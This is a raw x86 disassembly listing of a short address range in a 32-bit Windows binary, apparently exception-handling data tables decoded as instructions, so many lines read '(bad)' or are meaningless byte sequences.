  410c3f:	add    BYTE PTR [eax],al
  410c41:	add    BYTE PTR [eax],al
  410c43:	add    BYTE PTR [ebx-0x79],al
  410c46:	inc    eax
  410c47:	add    BYTE PTR [edx],ah
  410c49:	add    eax,0x11993
  410c4e:	add    BYTE PTR [eax],al
  410c50:	ins    BYTE PTR es:[edi],dx
  410c51:	or     al,0x41
	...
  410c6b:	add    bh,bh
  410c6d:	(bad)  
  410c6e:	(bad)  
  410c6f:	jmp    DWORD PTR [ebx]
  410c71:	test   DWORD PTR [eax+0x0],0x19930522
  410c78:	add    DWORD PTR [eax],eax
  410c7a:	add    BYTE PTR [eax],al
  410c7c:	cwde   
  410c7d:	or     al,0x41
	...
  410c97:	add    bh,bh
  410c99:	(bad)  
  410c9a:	(bad)  
  410c9b:	dec    DWORD PTR [ebx-0x9]
  410c9e:	inc    eax
  410c9f:	add    BYTE PTR [edx],ah
  410ca1:	add    eax,0x11993
  410ca6:	add    BYTE PTR [eax],al
  410ca8:	les    ecx,FWORD PTR [ecx+eax*2]
	...
  410cc3:	add    bh,bh
  410cc5:	(bad)  
  410cc6:	(bad)  
  410cc7:	inc    DWORD PTR [edi+esi*8+0x5220040]
  410cce:	xchg   ebx,eax
  410ccf:	sbb    DWORD PTR [ecx],eax
  410cd1:	add    BYTE PTR [eax],al
  410cd3:	add    al,dh
  410cd5:	or     al,0x41
	...
  410cef:	add    bh,bh
  410cf1:	(bad)  
  410cf2:	(bad)  
  410cf3:	(bad)  
  410cf4:	mov    ebp,0xfe0040f7
  410cf9:	(bad)  
  410cfa:	(bad)  
  410cfb:	inc    DWORD PTR [eax]
  410cfd:	add    BYTE PTR [eax],al
  410cff:	add    al,dl
  410d01:	(bad)  
  410d02:	(bad)  
  410d03:	inc    DWORD PTR [eax]
  410d05:	add    BYTE PTR [eax],al
  410d07:	add    dh,bh
  410d09:	(bad)  
  410d0a:	(bad)  
  410d0b:	jmp    DWORD PTR [edi-0x55]
  410d0e:	inc    eax
  410d0f:	add    BYTE PTR [ebp-0x55],dh
  410d12:	inc    eax
  410d13:	add    BYTE PTR [eax],al
  410d15:	add    BYTE PTR [eax],al
  410d17:	add    dh,bh
  410d19:	(bad)  
  410d1a:	(bad)  
  410d1b:	inc    DWORD PTR [eax]
  410d1d:	add    BYTE PTR [eax],al
  410d1f:	add    ah,dl
  410d21:	(bad)  
  410d22:	(bad)  
  410d23:	inc    DWORD PTR [eax]
  410d25:	add    BYTE PTR [eax],al
  410d27:	add    dh,bh
  410d29:	(bad)  
  410d2a:	(bad)  
  410d2b:	dec    DWORD PTR [edi-0x54]
  410d2e:	inc    eax
  410d2f:	add    BYTE PTR [ebp-0x54],bl
  410d32:	inc    eax
  410d33:	add    BYTE PTR [eax],al
  410d35:	add    BYTE PTR [eax],al
  410d37:	add    ah,ah
  410d39:	(bad)  
  410d3a:	(bad)  
  410d3b:	inc    DWORD PTR [eax]
  410d3d:	add    BYTE PTR [eax],al
  410d3f:	add    al,dl
  410d41:	(bad)  
  410d42:	(bad)  
  410d43:	inc    DWORD PTR [eax]
  410d45:	add    BYTE PTR [eax],al
  410d47:	add    dh,bh
  410d49:	(bad)  
  410d4a:	(bad)  
  410d4b:	inc    DWORD PTR [edi]
  410d4d:	loop   0x410d8f
  410d4f:	add    BYTE PTR [ebx],bl
  410d51:	loop   0x410d93
  410d53:	add    BYTE PTR [eax],al
  410d55:	add    BYTE PTR [eax],al
  410d57:	add    ah,ah
  410d59:	(bad)  
  410d5a:	(bad)  
  410d5b:	inc    DWORD PTR [eax]
  410d5d:	add    BYTE PTR [eax],al
  410d5f:	add    al,dl
  410d61:	(bad)  
  410d62:	(bad)  
  410d63:	inc    DWORD PTR [eax]
  410d65:	add    BYTE PTR [eax],al
  410d67:	add    dh,bh
  410d69:	(bad)  
  410d6a:	(bad)  
  410d6b:	inc    DWORD PTR [eax]
  410d6d:	add    BYTE PTR [eax],al
  410d6f:	add    BYTE PTR [ebp-0x1d],ah
  410d72:	inc    eax
  410d73:	add    BYTE PTR [eax],al
  410d75:	add    BYTE PTR [eax],al
  410d77:	add    ah,ah
  410d79:	(bad)  
  410d7a:	(bad)  
  410d7b:	inc    DWORD PTR [eax]
  410d7d:	add    BYTE PTR [eax],al
  410d7f:	add    al,cl
  410d81:	(bad)  
  410d82:	(bad)  
  410d83:	inc    DWORD PTR [eax]
  410d85:	add    BYTE PTR [eax],al
  410d87:	add    dh,bh
  410d89:	(bad)  
  410d8a:	(bad)  
  410d8b:	push   DWORD PTR [ebp-0x20ffbf1d]
  410d91:	jecxz  0x410dd3
  410d93:	add    BYTE PTR [eax],al
  410d95:	add    BYTE PTR [eax],al
  410d97:	add    dh,bh
  410d99:	(bad)  
  410d9a:	(bad)  
  410d9b:	inc    DWORD PTR [eax]
  410d9d:	add    BYTE PTR [eax],al
  410d9f:	add    ah,dl
  410da1:	(bad)  
  410da2:	(bad)  
  410da3:	inc    DWORD PTR [eax]
  410da5:	add    BYTE PTR [eax],al
  410da7:	add    dh,bh
  410da9:	(bad)  
  410daa:	(bad)  
  410dab:	call   FWORD PTR [esi+eiz*8]
  410dae:	inc    eax
  410daf:	add    BYTE PTR [eax],ah
  410db1:	out    0x40,al
  410db3:	add    BYTE PTR [eax],al
  410db5:	add    BYTE PTR [eax],al
  410db7:	add    dh,bh
  410db9:	(bad)  
  410dba:	(bad)  
  410dbb:	inc    DWORD PTR [eax]
  410dbd:	add    BYTE PTR [eax],al
  410dbf:	add    al,bl
  410dc1:	(bad)  
  410dc2:	(bad)  
  410dc3:	inc    DWORD PTR [eax]
  410dc5:	add    BYTE PTR [eax],al
  410dc7:	add    dh,bh
  410dc9:	(bad)  
  410dca:	(bad)  
  410dcb:	jmp    FWORD PTR [ebx-0x19]
  410dce:	inc    eax
  410dcf:	add    BYTE PTR [esi-0x19],bh
  410dd2:	inc    eax
  410dd3:	add    BYTE PTR [eax],al
  410dd5:	add    BYTE PTR [eax],al
  410dd7:	add    BYTE PTR [eax],dl
  410dd9:	adc    BYTE PTR [ecx+0x0],al
  410ddc:	add    BYTE PTR [eax],al
  410dde:	add    BYTE PTR [eax],al
  410de0:	(bad)  
  410de1:	(bad)  
  410de2:	(bad)  
  410de3:	inc    DWORD PTR [eax]
  410de5:	add    BYTE PTR [eax],al
  410de7:	add    BYTE PTR [eax],dl
  410de9:	add    BYTE PTR [eax],al
  410deb:	add    BYTE PTR [eax],dh
  410ded:	xchg   ecx,eax
  410dee:	inc    eax
  410def:	add    BYTE PTR [eax],al
  410df1:	add    BYTE PTR [eax],al
  410df3:	add    BYTE PTR [eax+0x4091],dl
  410df9:	add    BYTE PTR [eax],al
  410dfb:	add    BYTE PTR [eax],al
  410dfd:	push   cs
  410dfe:	inc    ecx
  410dff:	add    BYTE PTR [ecx],al
  410e01:	add    BYTE PTR [eax],al
  410e03:	add    ah,dl
  410e05:	.byte 0xd
  410e06:	inc    ecx
	...
